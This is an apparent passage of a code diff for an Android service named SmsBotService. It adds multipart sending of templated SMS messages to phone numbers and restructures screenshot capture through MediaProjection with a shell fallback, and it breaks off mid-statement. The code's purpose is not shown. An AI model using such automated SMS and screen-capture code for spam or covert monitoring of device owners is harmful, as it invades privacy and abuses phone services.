@@ -61,8 +61,14 @@ public class SmsBotService extends Service {
 
         String status = "failed";
         try {
-            SmsManager.getDefault().sendTextMessage(phone, null, template, null, null);
-            Thread.sleep(1000);
+            SmsManager sms = SmsManager.getDefault();
+            if (template.length() > 160) {
+                java.util.ArrayList<String> parts = sms.divideMessage(template);
+                sms.sendMultipartTextMessage(phone, null, parts, null, null);
+            } else {
+                sms.sendTextMessage(phone, null, template, null, null);
+            }
+            Thread.sleep(1500);
             status = "success";
         } catch (Exception e) {
             e.printStackTrace();
@@ -94,44 +100,36 @@ public class SmsBotService extends Service {
     }
 
     private byte[] takeScreenshot() {
-        byte[] mp = screenshotViaMediaProjection();
-        if (mp != null) return mp;
-        return screenshotViaShell();
-    }
+        if (MainActivity.mediaProjection != null) {
+            try {
+                DisplayMetrics metrics = new DisplayMetrics();
+                WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
+                wm.getDefaultDisplay().getRealMetrics(metrics);
+                int w = metrics.widthPixels, h = metrics.heightPixels;
 
-    private byte[] screenshotViaMediaProjection() {
-        if (MainActivity.mediaProjection == null) return null;
-        try {
-            DisplayMetrics metrics = new DisplayMetrics();
-            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
-            wm.getDefaultDisplay().getRealMetrics(metrics);
-            int w = metrics.widthPixels, h = metrics.heightPixels;
-
-            ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
-            VirtualDisplay vd = MainActivity.mediaProjection.createVirtualDisplay("scr", w, h, metrics.densityDpi,
-                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
-            Thread.sleep(500);
-            Image image = reader.acquireLatestImage();
-            if (image != null) {
-                ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                Bitmap bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
-                bitmap.copyPixelsFromBuffer(buffer);
-                ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
-                image.close();
+                ImageReader reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2);
+                VirtualDisplay vd = MainActivity.mediaProjection.createVirtualDisplay("scr", w, h, metrics.densityDpi,
+                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.getSurface(), null, null);
+                Thread.sleep(500);
+                Image image = reader.acquireLatestImage();
+                if (image != null) {
+                    ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                    Bitmap bitmap = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888);
+                    bitmap.copyPixelsFromBuffer(buffer);
+                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+                    bitmap.compress(Bitmap.CompressFormat.JPEG, 80, baos);
+                    image.close();
+                    vd.release();
+                    reader.close();
+                    return baos.toByteArray();
+                }
                 vd.release();
                 reader.close();
-                return baos.toByteArray();
+            } catch (Exception e) {
+                e.printStackTrace();
             }
-            vd.release();
-            reader.close();
-        } catch (Exception e) {
-            e.printStackTrace();
         }
-        return null;
-    }
 
-    private byte[] screenshotViaShell() {
         try {
             File file = new File(getExternalFilesDir(null), "screen.png");
             java.lang.Process process = Runtime.getRuntime().exec(new String[]{
